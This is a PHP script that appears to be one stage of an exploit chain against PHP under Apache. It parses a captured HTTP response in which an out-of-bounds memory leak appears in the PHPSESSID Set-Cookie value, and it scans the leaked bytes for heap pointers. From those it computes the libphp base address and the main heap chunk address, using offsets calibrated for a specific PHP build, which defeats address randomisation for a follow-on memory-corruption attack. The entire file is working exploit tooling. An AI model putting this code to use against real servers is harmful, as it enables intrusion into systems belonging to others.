<?php
declare(strict_types=1);
/*
 * Parse the B1 Set-Cookie OOB leak and print "main_hex libphp_hex".
 *
 * Rules (calibrated on php:8.5.11-apache, 128M, display_errors=Off):
 *  - heap qwords: 0x700000000000 < q < 0x800000000000
 *  - zval_ptr_dtor = the most frequent qword whose low 12 bits are 0x7a0;
 *    libphp = qword - 0x7b47a0
 *  - buckets by q & ~0x1FFFFF; the largest bucket is the id chunk (the window's
 *    own chunk), the bucket containing the dtor qword is libphp; the next
 *    bucket with count >= 50 and |bucket - libphp| < 0x4000000 is the main
 *    chunk.
 */
$file = $argv[1] ?? '/tmp/off_leak.resp';
$raw = @file_get_contents($file);
if ($raw === false || !preg_match('/Set-Cookie:\s*PHPSESSID=([^;\r\n]*)/i', $raw, $m)) {
    fwrite(STDERR, "parse_leak: no Set-Cookie in $file\n");
    exit(1);
}
$d = rawurldecode($m[1]);
$counts = [];
$buckets = [];
$n = strlen($d);
for ($o = 0; $o + 8 <= $n; $o++) {
    $q = unpack('P', substr($d, $o, 8))[1];
    if ($q > 0x700000000000 && $q < 0x800000000000) {
        $k = sprintf('%016x', $q);
        $counts[$k] = ($counts[$k] ?? 0) + 1;
        $b = sprintf('%016x', $q & ~0x1FFFFF);
        $buckets[$b] = ($buckets[$b] ?? 0) + 1;
    }
}
if (!$counts || !$buckets) {
    fwrite(STDERR, "parse_leak: no heap pointers in the leak\n");
    exit(1);
}
arsort($counts);
arsort($buckets);

$dtor = 0;
foreach ($counts as $k => $c) {
    $x = hexdec($k);
    if (($x & 0xFFF) === 0x7a0) {
        $dtor = $x;
        break;
    }
}
if ($dtor === 0) {
    fwrite(STDERR, "parse_leak: no zval_ptr_dtor candidate\n");
    exit(1);
}
$lib = $dtor - 0x7b47a0;
$lib_bucket = $dtor & ~0x1FFFFF;

$i = 0;
$main = 0;
foreach ($buckets as $k => $c) {
    $b = hexdec($k);
    if ($i++ === 0) {
        continue;                 // id chunk (largest cluster)
    }
    if ($b === $lib_bucket) {
        continue;                 // libphp cluster
    }
    if ($c >= 50 && abs($b - $lib) < 0x4000000) {
        $main = $b;
        break;
    }
}
if ($main === 0) {
    fwrite(STDERR, "parse_leak: no main-chunk candidate\n");
    exit(1);
}
printf("%x %x\n", $main, $lib);
